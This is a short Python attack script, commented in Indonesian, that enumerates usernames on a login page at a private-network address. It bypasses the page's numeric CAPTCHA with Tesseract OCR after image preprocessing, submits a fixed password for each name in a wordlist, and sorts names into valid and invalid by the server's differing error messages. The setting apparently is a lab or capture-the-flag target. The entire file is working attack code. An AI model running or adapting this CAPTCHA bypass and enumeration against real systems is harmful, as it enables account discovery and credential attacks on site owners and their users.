import requests
from PIL import Image
import pytesseract
from io import BytesIO
from bs4 import BeautifulSoup

pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

# Konfigurasi
url_login = 'http://192.168.70.202:3333/login3.php'
base_url = 'http://192.168.70.202:3333/'
userlist_file = 'username-wordlists.txt'
fixed_password = 'test123'

# Ambil username dari file
with open(userlist_file, 'r', encoding='utf-8') as f:
    usernames = [line.strip() for line in f if line.strip()]

session = requests.Session()

for username in usernames:
    try:
        # 1. Ambil halaman login untuk dapatkan URL captcha dinamis
        r = session.get(url_login)
        soup = BeautifulSoup(r.text, 'html.parser')
        captcha_img = soup.find('img', {'src': lambda x: x and 'captcha.php' in x})

        if not captcha_img:
            print(f"[!] CAPTCHA image tidak ditemukan untuk {username}")
            continue

        captcha_url = base_url + captcha_img['src']

        # 2. Ambil CAPTCHA image
        captcha_response = session.get(captcha_url)
        image = Image.open(BytesIO(captcha_response.content)).convert('L')  # grayscale

        # 3. Preprocessing image (resize + threshold)
        image = image.resize((image.width * 2, image.height * 2))
        image = image.point(lambda x: 0 if x < 150 else 255, '1')  # binarize

        # 4. OCR
        captcha_text = pytesseract.image_to_string(image, config='--psm 6 -c tessedit_char_whitelist=0123456789')
        captcha = ''.join(filter(str.isdigit, captcha_text))

        if not captcha or len(captcha) < 3:
            print(f"[!] Gagal OCR CAPTCHA untuk {username} (hasil: {captcha_text.strip()})")
            continue

        print(f"[{username}] CAPTCHA OCR: {captcha}")

        # 5. Kirim POST login
        payload = {
            'username': username,
            'password': fixed_password,
            'captcha': captcha
        }

        response = session.post(url_login, data=payload)

        if "Password salah." in response.text:
            print(f"[✅] Username valid: {username}")
        elif "User tidak ditemukan." in response.text:
            print(f"[❌] Username tidak valid: {username}")
        else:
            print(f"[?] Respons tidak dikenali untuk {username}")
    except Exception as e:
        print(f"[!] Error untuk {username}: {e}")
